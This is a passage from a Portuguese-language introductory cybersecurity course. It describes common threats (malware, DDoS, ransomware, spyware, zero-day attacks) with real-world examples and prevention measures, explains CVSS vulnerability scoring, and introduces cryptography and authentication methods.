projetado para causar danos, explorar ou comprometer computadores, redes ou 
dispositivos móveis. Existem vários tipos de malware, incluindo vírus, worms, 
Trojans, ransomware, spyware, entre outros. 
Detalhes: 
• 
Como Funciona: O malware é projetado para se infiltrar em um 
dispositivo ou rede e realizar uma variedade de atividades prejudiciais, 
como roubo de dados, controle remoto de sistemas, espionagem, ou 
mesmo destruição de dados. Ele pode ser introduzido por meio de anexos 
de e-mail, downloads de software, ou até por dispositivos USB 
comprometidos. 
• 
Principais Tipos: 
o Vírus: Programas que se replicam ao se anexar a arquivos 
legítimos. 
o Worms: Software autônomo que se espalha entre dispositivos sem 
intervenção do usuário. 
o Trojans: Programas maliciosos que se disfarçam como software 
legítimo. 
o Adware: Malware que exibe anúncios indesejados. 
o Rootkits: Malware que oferece controle administrativo a hackers. 
Exemplo Real: 
• 
Emotet (2021): O Emotet foi uma rede de malware (botnet) altamente 
sofisticada, que começou como um Trojan bancário e evoluiu para uma 
das maiores plataformas de malware para distribuir ransomware e outros 
tipos de ameaças. Em janeiro de 2021, as autoridades de várias nações 
colaboraram para desmantelar a botnet Emotet, que havia infectado 
milhões de computadores ao redor do mundo. 
Prevenção: 
• 
Antivírus e Antimalware: Manter softwares antivírus e antimalware 
atualizados ajuda a detectar e remover malware. 
• 
Monitoramento Contínuo: Soluções de monitoramento de rede ajudam 
a identificar comportamentos anômalos causados por malware. 
• 
Educação de Usuários: Treinar funcionários para evitar downloads de 
fontes desconhecidas e não clicar em links suspeitos é uma prática 
essencial. 

 
 
 
2. Ataques DDoS (Distributed Denial of Service) 
Um ataque DDoS ocorre quando um atacante sobrecarrega um sistema, serviço 
ou rede com um fluxo massivo de tráfego, geralmente de vários dispositivos 
comprometidos (botnets), com o objetivo de interromper o serviço normal. Esse 
ataque visa indisponibilizar websites, servidores e serviços online ao esgotar os 
recursos da rede ou servidor. 
Detalhes: 
• 
Como Funciona: Um ataque DDoS é realizado por uma rede de 
computadores infectados (botnet) que enviam grandes volumes de 
tráfego para um alvo, como um servidor de um website ou uma rede 
corporativa. Isso sobrecarrega os recursos do sistema, causando lentidão 
extrema ou interrupção completa do serviço. 
• 
Motivações: Ataques DDoS podem ser motivados por uma série de 
razões, incluindo sabotagem de concorrentes, protestos ativistas 
(hacktivismo) ou tentativas de extorsão. 
Exemplo Real: 
• 
Ataque ao Google (2022): Em junho de 2022, o Google relatou o maior 
ataque DDoS até o momento. O ataque atingiu um pico de 46 milhões de 
solicitações por segundo, o que é equivalente a todo o tráfego de 
consultas diárias de uma cidade grande como Paris. O Google conseguiu 
mitigar o ataque usando sua infraestrutura robusta de mitigação DDoS. 
Prevenção: 
• 
Serviços de Mitigação de DDoS: Serviços especializados, como os 
oferecidos por provedores de nuvem e CDNs (Content Delivery 
Networks), podem absorver o tráfego DDoS e proteger o serviço-alvo. 
• 
Escalonamento de Infraestrutura: Manter uma infraestrutura escalável 
e redundante para suportar tráfego adicional durante ataques. 
• 
Monitoramento de Tráfego: Utilizar ferramentas de monitoramento em 
tempo real para detectar picos anômalos de tráfego. 
 
3. Ransomware 
Ransomware é um tipo de malware que criptografa os dados da vítima ou 
bloqueia o acesso ao sistema, exigindo um pagamento de resgate (geralmente 
em criptomoedas) para restaurar o acesso ou descriptografar os arquivos. O 
ransomware pode causar interrupções massivas e danos financeiros graves. 
Detalhes: 
• 
Como Funciona: O ransomware é geralmente introduzido por meio de e-
mails de phishing, downloads de software infectado, ou exploração de 
vulnerabilidades de software. Depois de instalado, o malware criptografa 
arquivos importantes ou bloqueia o acesso ao sistema, exibindo uma 
mensagem de resgate com instruções sobre como fazer o pagamento. 
• 
Consequências: As vítimas podem perder permanentemente o acesso 
aos dados ou enfrentar grandes prejuízos financeiros e operacionais. 
Exemplo Real: 
• 
Colonial Pipeline (2021): Em maio de 2021, um dos maiores oleodutos 
dos Estados Unidos, a Colonial Pipeline, foi alvo de um ataque de 
ransomware perpetrado pelo grupo DarkSide. O ataque interrompeu o 
fornecimento de combustível na costa leste dos EUA por vários dias, 
causando uma crise de abastecimento. A empresa pagou um resgate de 
US$ 4,4 milhões em bitcoin para recuperar o acesso aos seus sistemas. 

 
 
Prevenção: 
• 
Backups Frequentes: Manter backups regulares e offline dos dados 
críticos garante que a organização possa restaurar sistemas sem pagar o 
resgate. 
• 
Segmentação de Rede: Limitar a movimentação lateral do ransomware 
dentro da rede, segmentando sistemas e redes sensíveis. 
• 
Educação de Funcionários: Treinar os funcionários sobre como 
reconhecer e evitar e-mails de phishing que possam entregar 
ransomware. 
 
4. Spyware 
Spyware é um tipo de malware que monitora secretamente as atividades de um 
usuário em um dispositivo e coleta informações confidenciais, como credenciais 
de login, dados bancários ou hábitos de navegação. O spyware pode ser difícil 
de detectar, pois opera em segundo plano. 
Detalhes: 
• 
Como Funciona: O spyware é instalado no dispositivo da vítima, muitas 
vezes sem o conhecimento do usuário, por meio de downloads de 
software infectado ou aplicativos de fontes não confiáveis. Ele coleta 
informações como pressionamentos de teclas, senhas e atividades de 
navegação, enviando essas informações de volta ao atacante. 
• 
Finalidade: Spyware pode ser usado para roubar dados financeiros, 
espionar atividades corporativas, ou roubar informações pessoais, que 
podem ser usadas em fraudes. 
Exemplo Real: 
• 
Spyware Pegasus (2021): O Pegasus, um software de spyware 
desenvolvido pelo grupo israelense NSO, foi usado para espionar 
jornalistas, ativistas de direitos humanos e políticos em todo o mundo. Ele 
foi capaz de infectar dispositivos iOS e Android sem que os usuários 
precisassem interagir com o software (zero-click attack). As descobertas 
revelaram que centenas de pessoas foram monitoradas ilegalmente, 
gerando um grande escândalo global. 
Prevenção: 
• 
Softwares Antispyware: Manter um software antispyware ativo pode 
ajudar a detectar e remover spyware instalado. 
• 
Downloads Seguros: Evitar o download de software de fontes não 
verificadas ou suspeitas é uma medida preventiva crucial. 
• 
Criptografia de Dados: Criptografar dados sensíveis e comunicações 
importantes ajuda a mitigar os danos causados por spyware. 
 
5. Ataques Zero-Day 
Um ataque zero-day ocorre quando os atacantes exploram uma vulnerabilidade 
desconhecida por desenvolvedores ou fornecedores de software, o que significa 
que ainda não há um patch ou correção disponível. Esses ataques são altamente 
eficazes porque as defesas tradicionais não estão preparadas para lidar com 
essa nova vulnerabilidade. 
Detalhes: 
• 
Como 
Funciona: 
Os 
invasores 
descobrem 
e 
exploram 
uma 
vulnerabilidade no software antes que o fornecedor possa corrigi-la. Eles 
podem usar a falha para comprometer sistemas, instalar malware ou 
roubar 
informações 
confidenciais. 
Os 
ataques 
zero-day 
são 

 
 
frequentemente usados em ataques direcionados contra alvos de alto 
valor, como governos e grandes corporações. 
• 
Gravidade: Como os desenvolvedores ainda não estão cientes da falha 
ou não tiveram tempo de corrigi-la, os ataques zero-day são 
extremamente perigosos e eficazes. 
Exemplo Real: 
• 
Vulnerabilidade PrintNightmare (2021): Em 2021, uma vulnerabilidade 
zero-day no serviço Windows Print Spooler, conhecida como 
PrintNightmare, foi descoberta. A falha permitia que invasores 
executassem código remotamente em sistemas afetados, concedendo 
controle total sobre o dispositivo. A vulnerabilidade foi explorada antes de 
a Microsoft lançar um patch, o que levou a uma corrida para proteger 
sistemas vulneráveis em todo o mundo. 
Prevenção: 
• 
Monitoramento de Vulnerabilidades: Utilizar inteligência de ameaças e 
monitoramento de vulnerabilidades emergentes pode ajudar a detectar e 
mitigar vulnerabilidades zero-day mais rapidamente. 
• 
Segmentação de Rede e Controle de Acesso: A limitação de acesso a 
sistemas críticos e a implementação de políticas de segmentação de rede 
podem reduzir os impactos de um ataque zero-day. 
• 
Patch Management Eficiente: Assim que uma vulnerabilidade é 
divulgada e o patch é disponibilizado, é essencial aplicar a correção o 
mais rápido possível. 
 
Malware, DDoS, ransomware, spyware e ataques zero-day representam 
algumas das principais ameaças cibernéticas enfrentadas por organizações e 
indivíduos. Cada uma dessas ameaças tem características únicas e pode causar 
impactos significativos se não forem adequadamente mitigadas. A prevenção 
eficaz exige uma combinação de práticas de segurança proativas, 
monitoramento contínuo e uma cultura de segurança robusta, que inclua 
treinamento, backups regulares e a implementação de ferramentas avançadas 
de detecção e resposta. A constante evolução dessas ameaças torna essencial 
o investimento contínuo em segurança cibernética para proteger sistemas, 
dados e redes. 
 
2.3. COMO CALCULAR VULNERABILIDADES 
 
O cálculo de vulnerabilidades de segurança da informação é uma prática 
fundamental para garantir que as organizações entendam o risco associado a 
cada falha de segurança. O objetivo do cálculo é classificar e priorizar as 
vulnerabilidades, para que as equipes de segurança possam focar naquelas 
que têm o maior potencial de causar danos, caso sejam exploradas. Um dos 
frameworks mais amplamente utilizados para avaliar a gravidade das 
vulnerabilidades é o CVSS (Common Vulnerability Scoring System), que 
fornece uma pontuação padronizada com base em diversos fatores. 
Neste contexto, vamos explicar em detalhes como calcular vulnerabilidades de 
segurança, apresentando o CVSS, explicando como usar sua calculadora, e 
oferecendo embasamento teórico para compreender as métricas envolvidas. 
 
 
 

 
 
1. O Que é o CVSS? 
O Common Vulnerability Scoring System (CVSS) é um sistema de 
pontuação que padroniza a forma de medir a gravidade de vulnerabilidades em 
sistemas e softwares. Ele é amplamente aceito na indústria de segurança da 
informação e utilizado por várias organizações e plataformas de gerenciamento 
de vulnerabilidades, como o NIST e a MITRE. O CVSS foi desenvolvido para 
permitir que diferentes partes interessadas (empresas, governos, fornecedores 
de software etc.) avaliem vulnerabilidades de maneira uniforme. 
Por que usar o CVSS? 
• 
Padronização: O CVSS cria uma metodologia uniforme para avaliar a 
gravidade das vulnerabilidades, permitindo a comparação direta entre 
elas. 
• 
Priorização: As organizações podem usar as pontuações CVSS para 
priorizar o tratamento das vulnerabilidades com base na gravidade do 
impacto e na probabilidade de exploração. 
• 
Transparência: O CVSS é um framework aberto, garantindo que todos 
os aspectos da pontuação sejam transparentes e replicáveis. 
Estrutura do CVSS 
O CVSS é composto por três grupos de métricas principais: 
1. Base Score (Pontuação Base): Avalia as características intrínsecas da 
vulnerabilidade, ou seja, sua gravidade sem levar em consideração o 
ambiente onde ela se encontra. 
2. Temporal Score (Pontuação Temporal): Ajusta a pontuação base 
levando em consideração fatores como o tempo de exposição, a 
disponibilidade de correções ou exploits. 
3. Environmental Score (Pontuação Ambiental): Reflete o impacto 
específico da vulnerabilidade no ambiente da organização, ajustando a 
pontuação com base no uso ou no valor de ativos afetados. 
Vamos agora nos concentrar no cálculo da Pontuação Base, que é o ponto de 
partida mais comum. 
 
2. Componentes da Pontuação Base do CVSS 
A pontuação base do CVSS é composta por várias métricas que medem o 
impacto e a capacidade de exploração de uma vulnerabilidade. Esses fatores 
são combinados para gerar uma pontuação que vai de 0 a 10, onde 10 
representa uma vulnerabilidade extremamente crítica. 
Métricas da Pontuação Base: 
1. Attack Vector (Vetores de Ataque - AV) 
o Descrição: Determina a proximidade necessária do invasor ao 
sistema-alvo para explorar a vulnerabilidade. 
o Valores: 
§ 
Network (Rede): A vulnerabilidade pode ser explorada 
remotamente. 
§ 
Adjacent (Adjacente): O invasor precisa estar na mesma 
sub-rede da vítima. 
§ 
Local: O invasor precisa ter acesso físico ou estar logado 
no sistema. 
§ 
Physical (Físico): O invasor precisa ter acesso físico ao 
dispositivo. 
2. Attack Complexity (Complexidade do Ataque - AC) 

 
 
o Descrição: Avalia o nível de dificuldade necessário para explorar 
a vulnerabilidade. 
o Valores: 
§ 
Low (Baixo): A exploração é fácil e não depende de 
muitas condições. 
§ 
High (Alto): A exploração depende de múltiplos fatores, 
como configurações específicas. 
3. Privileges Required (Privilégios Necessários - PR) 
o Descrição: Determina o nível de permissões necessárias para o 
invasor explorar a vulnerabilidade. 
o Valores: 
§ 
None (Nenhum): O invasor não precisa de permissões. 
§ 
Low (Baixo): O invasor precisa de alguns privilégios de 
usuário. 
§ 
High (Alto): O invasor precisa de permissões 
administrativas. 
4. User Interaction (Interação do Usuário - UI) 
o Descrição: Avalia se o ataque exige a participação de um 
usuário, como clicar em um link ou abrir um arquivo. 
o Valores: 
§ 
None (Nenhuma): A vulnerabilidade pode ser explorada 
sem interação. 
§ 
Required (Necessária): O ataque exige que o usuário 
realize uma ação. 
5. Scope (Escopo - S) 
o Descrição: Avalia se a exploração da vulnerabilidade pode afetar 
outros componentes além do alvo inicial. 
o Valores: 
§ 
Unchanged (Inalterado): O ataque não afeta outros 
componentes além do alvo inicial. 
§ 
Changed (Alterado): O ataque pode ter impactos em 
outros componentes ou sistemas. 
6. Confidentiality Impact (Impacto na Confidencialidade - C) 
o Descrição: Mede o impacto sobre a confidencialidade dos dados, 
caso a vulnerabilidade seja explorada. 
o Valores: 
§ 
None (Nenhum): Não há impacto na confidencialidade. 
§ 
Low (Baixo): Algumas informações são expostas, mas 
não informações críticas. 
§ 
High (Alto): Informações confidenciais críticas são 
expostas. 
7. Integrity Impact (Impacto na Integridade - I) 
o Descrição: Avalia o impacto sobre a integridade dos dados ou 
sistemas. 
o Valores: 
§ 
None (Nenhum): Não há impacto. 
§ 
Low (Baixo): A integridade de alguns dados pode ser 
comprometida. 
§ 
High (Alto): A integridade de dados críticos pode ser 
comprometida. 
8. Availability Impact (Impacto na Disponibilidade - A) 

 
 
o Descrição: Mede o impacto sobre a disponibilidade do serviço ou 
sistema afetado. 
o Valores: 
§ 
None (Nenhum): Não há impacto. 
§ 
Low (Baixo): O desempenho pode ser afetado, mas o 
serviço continua funcionando. 
§ 
High (Alto): O serviço ou sistema pode ficar totalmente 
indisponível. 
Exemplo Prático de Cálculo da Pontuação Base: 
Cenário: Uma vulnerabilidade foi encontrada em um software web que permite 
a execução de comandos remotamente. A exploração pode ser feita via rede, 
sem necessidade de autenticação, e pode comprometer a integridade e 
disponibilidade do sistema. 
Vamos usar o CVSS Calculator para estimar a pontuação base: 
• 
Attack Vector (AV): Network (N) 
• 
Attack Complexity (AC): Low (L) 
• 
Privileges Required (PR): None (N) 
• 
User Interaction (UI): None (N) 
• 
Scope (S): Unchanged (U) 
• 
Confidentiality Impact (C): High (H) 
• 
Integrity Impact (I): High (H) 
• 
Availability Impact (A): High (H) 
Com base nessas métricas, a pontuação base seria 9.8 (em uma escala de 0 a 
10), indicando uma vulnerabilidade extremamente crítica. 
 
3. Usando o CVSS Calculator 
A Calculadora CVSS é uma ferramenta que permite calcular automaticamente 
a pontuação de uma vulnerabilidade com base nas métricas que discutimos. A 
calculadora é amplamente usada por profissionais de segurança, 
desenvolvedores e equipes de resposta a incidentes para avaliar o impacto 
potencial de uma vulnerabilidade e priorizar sua correção. 
Passo a Passo para Usar o CVSS Calculator: 
1. Acesse a Calculadora CVSS: Muitas organizações de segurança 
oferecem essa ferramenta online, como o NIST (National Institute of 
Standards and Technology) e a FIRST. 
2. Preencha as Métricas: Insira os valores das métricas que definem a 
vulnerabilidade (Attack Vector, Attack Complexity etc.). 
3. Calcule a Pontuação: A ferramenta gera automaticamente a pontuação 
base, temporal e ambiental (se preenchidas). 
4. Interprete a Pontuação: Uma pontuação próxima de 10 indica alta 
gravidade e necessidade urgente de mitigação. Vulnerabilidades com 
pontuação entre 4.0 e 6.9 são moderadas e vulnerabilidades abaixo de 
4.0 são consideradas de baixa gravidade. 
 
4. Outros Frameworks para Avaliação de Vulnerabilidades 
Além do CVSS, existem outros frameworks e metodologias que podem ser 
utilizados para calcular e avaliar vulnerabilidades, embora o CVSS seja o mais 
amplamente aceito. 
1. OWASP Risk Rating Methodology 
• 
Utilizado especificamente para vulnerabilidades em aplicativos web. 

 
 
• 
Avalia o risco com base em fatores como facilidade de exploração, 
impacto técnico e impacto no negócio. 
• 
É útil para priorizar correções em sistemas web e aplicativos que 
enfrentam o público. 
2. NIST SP 800-30 (Risk Management Framework) 
• 
Um framework mais abrangente que aborda todo o processo de 
avaliação de riscos, incluindo a identificação, análise e mitigação de 
vulnerabilidades. 
• 
Focado em avaliar o risco para a organização como um todo, levando 
em consideração o valor do ativo afetado e o impacto potencial em 
processos de negócios. 
 
5. Como Priorizar a Mitigação com Base no Cálculo de Vulnerabilidades 
Depois de calcular a gravidade das vulnerabilidades, o próximo passo é 
priorizar a mitigação. A pontuação obtida no CVSS ajuda a guiar essa decisão, 
mas outros fatores também podem ser considerados: 
• 
Exploitabilidade: Se existe um exploit disponível publicamente para a 
vulnerabilidade, ela deve ser priorizada. 
• 
Impacto no Negócio: Vulnerabilidades que afetam sistemas críticos ou 
dados sensíveis devem ser tratadas com mais urgência. 
• 
Tempo de Exposição: Quanto mais tempo uma vulnerabilidade fica 
sem correção, maior o risco de ser explorada. 
 
Calcular e avaliar vulnerabilidades de segurança é essencial para qualquer 
programa de segurança da informação. O uso de frameworks como o CVSS 
permite que as organizações padronizem a avaliação e priorização de 
vulnerabilidades com base em métricas objetivas. A combinação do CVSS com 
outros frameworks de avaliação, como o OWASP e o NIST, ajuda a fornecer 
uma visão completa dos riscos de segurança e auxilia na implementação de 
uma estratégia eficaz de mitigação. 
Ao aplicar esses métodos e ferramentas, as organizações podem tomar 
decisões informadas e proativas sobre como gerenciar e mitigar 
vulnerabilidades, reduzindo assim o risco de exploração e aumentando a 
resiliência de seus sistemas. 
 
 

 
 
UNIDADE 3 TECNOLOGIAS E TÉCNICAS PARA SEGURANÇA 
EM CAMADAS 
 
Iremos explorar de maneira objetiva, didática e introdutória nesta unidade 
assuntos como: compreensão de algoritmos criptográficos simétricos e 
assimétricos, princípios de segurança em redes e tecnologias para segurança 
de perímetro, técnicas e tecnologias para autenticações fortes. 
Ao final da unidade faremos uma introdução a hardening e porque ele é 
importante em segurança da informação. 
 
OBJETIVOS DA UNIDADE 3 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Saber diferenciar o que é cifrar, decifrar, codificar e embaralhar; 
 
• Base e diferenças entre criptografia simétrica e assimétrica; 
 
• Usar técnicas e tecnologias para boas estratégias de autenticação 
segura; 
 
• Saber quais diferentes tecnologias usar para defesa de perímetro em 
redes de computadores; 
 
• O que é hardening e quais frameworks podem ser usados para montar 
uma estratégia de endurecimento de configurações. 
 
 

 
 
 
3.1. FUNDAMENTOS DE CRIPTOGRAFIA: ALGORITMOS SIMÉTRICOS E 
ASSIMÉTRICOS 
 
A criptografia é o processo de proteger informações através de técnicas 
matemáticas, tornando-as ilegíveis para qualquer pessoa que não tenha as 
chaves corretas para decifrá-las. Ela é fundamental para garantir a 
confidencialidade, integridade, autenticidade e, em alguns casos, o não-
repúdio das informações. A criptografia desempenha um papel crucial em áreas 
como transações financeiras, comunicação segura, armazenamento de dados 
sensíveis e muito mais. 
Existem dois tipos principais de algoritmos criptográficos: simétricos e 
assimétricos. Cada um tem sua própria maneira de lidar com a cifragem e 
decifragem de dados. 
 
1. Criptografia Simétrica 
A criptografia simétrica utiliza uma única chave para tanto cifrar (criptografar) 
quanto decifrar (descriptografar) as informações. Ou seja, a mesma chave é 
compartilhada entre as partes que desejam se comunicar de forma segura. 
Características: 
• 
Única chave compartilhada: A mesma chave é usada para cifrar e 
decifrar os dados. 
• 
Rapidez: Os algoritmos simétricos são mais rápidos que os algoritmos 
assimétricos, pois exigem menos computação. 
• 
Segurança baseada no segredo da chave: Se a chave secreta for 
descoberta, todo o sistema é comprometido. 
Exemplo de Algoritmo Simétrico: AES (Advanced Encryption Standard) 
• 
AES é um dos algoritmos simétricos mais populares e seguros utilizados 
atualmente. Ele pode usar chaves de 128, 192 ou 256 bits. 
• 
Uso comum: AES é amplamente utilizado para proteger transações 
bancárias, arquivos em disco, redes Wi-Fi (WPA2) e em muitos outros 
contextos que requerem alta segurança e eficiência. 
Exemplo Prático: 
Imagine que Alice deseja enviar uma mensagem criptografada para Bob. Ela usa 
o algoritmo AES com uma chave compartilhada, digamos “12345”. Ela cifra a 
mensagem usando essa chave e envia a mensagem cifrada para Bob. Quando 
Bob recebe a mensagem, ele usa a mesma chave “12345” para decifrá-la e ler 
o conteúdo original. 
Vantagens: 
• 
Rapidez: Muito mais eficiente para grandes volumes de dados. 
• 
Adequado para sistemas com grandes quantidades de dados e 
processamento rápido, como sistemas de armazenamento e 
comunicação em redes locais. 
Desvantagem: 
• 
Distribuição de chaves: Um dos principais desafios da criptografia 
simétrica é garantir que as chaves sejam distribuídas de forma segura 
entre as partes. Se a chave for interceptada, toda a comunicação pode 
ser comprometida. 
• 
 
2. Criptografia Assimétrica 

 
 
A criptografia assimétrica, ao contrário da simétrica, utiliza duas chaves 
diferentes: uma chave pública e uma chave privada. A chave pública é usada 
para cifrar a mensagem e pode ser compartilhada com qualquer pessoa, 
enquanto a chave privada, que é mantida em segredo, é usada para decifrar a 
mensagem. 
Características: 
• 
Chave pública e privada: A chave pública é usada para cifrar os dados, 
enquanto a chave privada é usada para decifrá-los. Somente quem possui 
a chave privada pode decifrar as informações. 
• 
Segurança mais robusta: Como a chave privada nunca é compartilhada, 
a criptografia assimétrica resolve o problema de distribuição de chaves 
enfrentado pela criptografia simétrica. 
• 
Computacionalmente mais cara: Os algoritmos assimétricos requerem 
mais poder de processamento do que os simétricos, tornando-os menos 
eficientes para grandes volumes de dados. 
Exemplo de Algoritmo Assimétrico: RSA (Rivest-Shamir-Adleman) 
• 
RSA é um dos algoritmos assimétricos mais conhecidos e amplamente 
utilizados. Ele é usado em muitas aplicações de segurança, como 
navegadores de internet, e-mails seguros e transações de comércio 
eletrônico. 
• 
Uso comum: RSA é frequentemente usado em protocolos de segurança 
na web, como o SSL/TLS, que protege as transações de comércio 
eletrônico e as comunicações bancárias online. 
Exemplo Prático: 
Se Alice quer enviar uma mensagem para Bob, mas não tem uma maneira 
segura de compartilhar uma chave secreta, ela usa a chave pública de Bob para 
cifrar a mensagem. Bob, que possui a chave privada correspondente, pode 
decifrar a mensagem quando a receber. Mesmo que outra pessoa intercepte a 
mensagem, sem a chave privada, essa pessoa não conseguirá decifrá-la. 
Vantagens: 
• 
Segurança na distribuição de chaves: A chave pública pode ser 
compartilhada abertamente, enquanto a chave privada é mantida em 
segredo, resolvendo o problema da troca de chaves. 
• 
Autenticação 
e 
Assinaturas 
Digitais: 
Além 
de 
proteger 
a 
confidencialidade, os sistemas assimétricos são usados para verificar a 
identidade de remetentes e para criar assinaturas digitais, garantindo a 
autenticidade das mensagens. 
Desvantagem: 
• 
Desempenho: A criptografia assimétrica é mais lenta do que a simétrica, 
e, portanto, é geralmente usada para cifrar pequenas quantidades de 
dados, como chaves de sessão em vez de grandes volumes de dados. 
 
3. Conceitos Críticos em Criptografia 
Além dos algoritmos simétricos e assimétricos, existem vários conceitos 
fundamentais que formam a base da criptografia e são usados em diversas 
situações, incluindo cifrar, decifrar, embaralhar, codificar e hashing. 
 
3.1. Cifrar (Criptografar) 
• 
O que é? Cifrar é o processo de converter dados legíveis (texto simples) 
em um formato ilegível (texto cifrado), que só pode ser decifrado por 
alguém com a chave correta. 

 
 
• 
Exemplo Prático: Se você usa o AES para proteger um arquivo de texto, 
o conteúdo legível é convertido em uma sequência aparentemente 
aleatória de caracteres, conhecida como texto cifrado. 
 
3.2. Decifrar (Descriptografar) 
• 
O que é? Decifrar é o processo reverso de cifrar. Ele converte o texto 
cifrado de volta ao seu estado legível original, usando a chave correta. 
• 
Exemplo Prático: Usando o AES com a chave correta, Bob pode pegar 
a mensagem cifrada de Alice e decifrá-la, transformando-a de volta em 
texto simples. 
 
3.3. Embaralhar 
• 
O que é? Embaralhar é o processo de reorganizar os dados de maneira 
que não sigam o formato original, mas ainda possam ser reordenados, ao 
contrário de cifrar, onde os dados se tornam incompreensíveis sem uma 
chave. Embaralhar é usado como uma medida básica de ofuscação, mas 
não oferece a segurança de um sistema de criptografia. 
• 
Exemplo Prático: Em alguns jogos online, os dados dos jogadores 
podem ser embaralhados para evitar que sejam lidos diretamente. No 
entanto, embaralhar não garante a segurança do conteúdo, pois pode ser 
facilmente revertido sem a chave. 
 
3.4. Codificar 
• 
O que é? Codificar é o processo de converter dados de um formato para 
outro. Diferente da criptografia, a codificação não envolve segredo, e 
qualquer um que conheça o esquema de codificação pode revertê-lo. 
• 
Exemplo Prático: A codificação Base64 é frequentemente usada para 
converter dados binários em uma sequência de texto legível para 
transmissão em redes que não aceitam dados binários. Embora os dados 
sejam convertidos para um formato diferente, eles não são protegidos 
contra acesso não autorizado. 
 
3.5. Hashing 
• 
O que é? O hashing é o processo de transformar dados de qualquer 
tamanho em uma string de tamanho fixo (o hash), que é uma 
representação exclusiva dos dados originais. Diferente da criptografia, o 
hashing é unidirecional, ou seja, não pode ser revertido para recuperar 
os dados originais. 
• 
Exemplo Prático: Funções de hash, como SHA-256, são amplamente 
usadas em sistemas de verificação de integridade de arquivos e para 
armazenar senhas de maneira segura. Quando um usuário cria uma 
senha, ela é transformada em um hash. No login, a senha digitada pelo 
usuário é transformada novamente em um hash, e se o resultado for igual 
ao hash armazenado, o acesso é concedido. 
 
Exemplo Prático de Hashing: 
• 
Senhas: Quando um usuário cria uma conta em um sistema, sua senha 
é convertida em um hash (por exemplo, usando SHA-256). A senha 
original não é armazenada. Quando o usuário tenta fazer login, o sistema 
aplica a função de hash na senha inserida e compara o resultado com o 
hash armazenado. Se eles corresponderem, o login é autorizado. 

 
 
Resumo dos Termos e Exemplos: 
 
1. Cifrar: Convertendo dados legíveis em um formato ilegível com o uso de 
uma chave (exemplo: uso de AES para criptografar dados). 
2. Decifrar: Convertendo o texto cifrado de volta ao formato original com a 
chave correta (exemplo: usando a chave AES para decifrar uma 
mensagem). 
3. Embaralhar: Reorganizando dados de forma que pareçam misturados, 
mas ainda possam ser rearranjados (exemplo: dados de um jogo sendo 
reorganizados). 
4. Codificar: Convertendo dados de um formato para outro sem o objetivo 
de segurança (exemplo: convertendo uma imagem para Base64). 
5. Hashing: Convertendo dados em um valor fixo de comprimento que não 
pode ser revertido (exemplo: usando SHA-256 para proteger senhas). 
 
A criptografia desempenha um papel crucial na proteção de informações 
sensíveis em diversos cenários, como comunicações seguras, transações 
financeiras e autenticação de usuários. Os algoritmos simétricos e 
assimétricos são fundamentais para garantir a confidencialidade dos dados, 
cada um com suas características, vantagens e desvantagens. Além disso, os 
conceitos de cifrar, decifrar, embaralhar, codificar e hashing são essenciais 
para entender como as informações podem ser protegidas, transmitidas e 
verificadas em sistemas de segurança. 
 
 
3.2. TECNICAS DE AUTENTICAÇÃO SEGURA: SENHAS, BIOMETRIA E 
AUTENTICAÇÃO MULTIFATOR 
 
A autenticação é o processo pelo qual um sistema verifica a identidade de um 
usuário antes de permitir o acesso a informações, sistemas ou serviços. A 
autenticação segura é fundamental para proteger contas, dados e sistemas 
contra acessos não autorizados. Existem várias técnicas de autenticação, sendo 
as mais comuns: senhas, biometria e autenticação multifator (MFA). 
Vamos explorar detalhadamente cada uma dessas técnicas, como elas 
funcionam e os desafios e benefícios associados a cada uma. 
 
1. Senhas: O Método Clássico de Autenticação 
Senhas são o método mais comum e tradicional de autenticação. Elas consistem 
em uma sequência de caracteres (letras, números e símbolos) que o usuário cria 
e usa para acessar contas e sistemas. 
 
Como Funciona: 
• 
Um usuário cria uma senha para uma conta específica (por exemplo, um 
e-mail, conta bancária ou sistema corporativo). 
• 
Sempre que o usuário deseja acessar essa conta, ele precisa fornecer a 
senha para autenticar sua identidade. 
• 
O sistema compara a senha inserida com a armazenada (geralmente 
como um hash, em vez da própria senha em texto simples) e, se 
corresponder, concede acesso. 
Boas Práticas com Senhas: 

 
 
• 
Complexidade: Use senhas longas e complexas, combinando letras 
maiúsculas, minúsculas, números e símbolos. 
• 
Única por Conta: Nunca reutilize a mesma senha para múltiplas contas. 
Se uma senha for comprometida, outras contas também podem ser 
acessadas. 
• 
Gerenciadores de Senhas: Ferramentas de gerenciamento de senhas 
podem ajudar a criar, armazenar e lembrar senhas complexas e 
exclusivas para cada conta. 
Exemplos de Problemas com Senhas: 
• 
Senhas Fracas: Senhas fáceis, como “123456” ou “senha”, são comuns e 
fáceis de adivinhar. 
• 
Ataques de Força Bruta: Hackers podem usar ataques de força bruta para 
tentar várias combinações de senha até adivinhar a correta. 
• 
Phishing: Se um usuário for vítima de phishing e fornecer sua senha em 
um site falso, ela pode ser roubada. 
Exemplo Real: 
• 
O ataque de phishing é uma das principais causas de roubo de senhas. 
Em 2020, o Google relatou que mais de 12 milhões de senhas foram 
comprometidas globalmente por meio de ataques de phishing, onde as 
vítimas inseriam suas senhas em sites falsos. 
Desvantagens: 
• 
As senhas são vulneráveis a ataques como phishing e adivinhação (brute-
force). 
• 
A necessidade de memorizar várias senhas leva muitos usuários a criar 
senhas fracas ou reutilizar senhas em várias contas. 
 
2. Biometria: Autenticação Baseada em Características Únicas 
A biometria usa características físicas ou comportamentais únicas para verificar 
a identidade de um usuário. Como as características biométricas são únicas para 
cada pessoa, a autenticação biométrica oferece um alto nível de segurança. 
 
Tipos de Biometria: 
• 
Impressão Digital: A mais comum e amplamente usada, a impressão 
digital é capturada e comparada a um padrão armazenado. 
• 
Reconhecimento Facial: Usa câmeras para capturar uma imagem do 
rosto do usuário e compará-la a uma imagem armazenada. 
• 
Reconhecimento de Íris: Analisa os padrões únicos da íris do olho. 
• 
Reconhecimento de Voz: Identifica o usuário com base no padrão vocal 
único. 
Como Funciona: 
1. O sistema biométrico captura a característica física (por exemplo, 
impressão digital, rosto ou voz) do usuário. 
2. Essa característica é comparada a um modelo previamente armazenado 
(também chamado de “template biométrico”). 
3. Se houver correspondência, o usuário é autenticado e recebe acesso ao 
sistema. 
Vantagens da Biometria: 
• 
Única para Cada Pessoa: Como as características biométricas são 
únicas, é difícil duplicá-las ou roubá-las. 

 
 
• 
Conveniência: Os usuários não precisam se lembrar de senhas ou 
carregar dispositivos físicos (como tokens). Basta usar seu corpo para 
autenticação. 
Exemplo de Uso: 
• 
Smartphones: O desbloqueio de smartphones com impressões digitais 
(Touch ID) ou reconhecimento facial (Face ID) é um exemplo popular de 
autenticação biométrica. Essas tecnologias oferecem uma maneira rápida 
